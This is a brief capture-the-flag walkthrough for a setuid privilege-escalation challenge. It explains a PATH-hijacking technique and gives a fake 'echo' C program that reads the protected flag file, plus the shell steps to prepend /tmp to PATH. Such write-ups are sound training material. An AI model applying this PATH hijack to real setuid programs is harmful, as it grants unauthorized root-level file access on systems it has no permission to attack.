If you notice the permissions on the executable file 'challenge' -> it has a setuid bit enabled. That means that this file would be executed with the privileges of the owner of the file. However, the is not the case with the flag file. You do not have permissions to read the flag file. So how, would you get the contents of the flag file?

If you look at the challenge.c program it is executing a system command with echo. The way it works is that it looks for the echo executable inside the PATH variable. If we can modify the PATH variable to have our own echo executable then anything inside our created executable will be executed with the permissions of the setuid enabled program.


Steps :-

1. Create a program with the name echo.c inside /tmp (It is critical to name the file as echo.c)

#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("cat /home/privilege-escalation/getflag");
}

2. Compile the program

3. Add /tmp to the PATH variable
PATH=/tmp/:$PATH

4. Executing the setuid enabled enabled program should give you the flag.

